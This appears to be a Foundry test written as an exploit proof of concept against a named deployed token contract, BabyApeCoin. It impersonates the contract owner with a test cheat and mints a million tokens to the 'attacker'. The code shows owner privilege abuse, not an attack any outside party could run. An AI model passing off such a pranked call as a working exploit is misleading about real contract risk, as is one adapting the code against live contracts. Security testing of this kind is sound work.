pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBabyApeCoin {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(address _to, uint256 _amount) external;
    function burn(address _from, uint256 _amount) external;
    function transferBabyApeByOwner(address _to, uint256 _amount) external;
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86;
    address attacker = address(this);
    IBabyApeCoin token;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IBabyApeCoin(TARGET);
        vm.label(TARGET, "BabyApeCoin");
        owner = token.owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceERC20 = IERC20(0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86).balanceOf(address(this));
        uint256 initialBalance = token.balanceOf(attacker);

        // Impersonate the contract owner
        vm.startPrank(owner);

        // Exploit: Mint tokens directly to attacker address (owner privilege abuse)
        uint256 mintAmount = 1000000 * 1e18;
        token.mint(attacker, mintAmount);

        vm.stopPrank();

        // Verify attacker balance increased
        uint256 finalBalance = token.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase after mint exploit");
        assertEq(finalBalance, mintAmount, "Attacker should have exactly the minted amount");
        uint256 finalBalanceERC20 = IERC20(0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalanceERC20, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

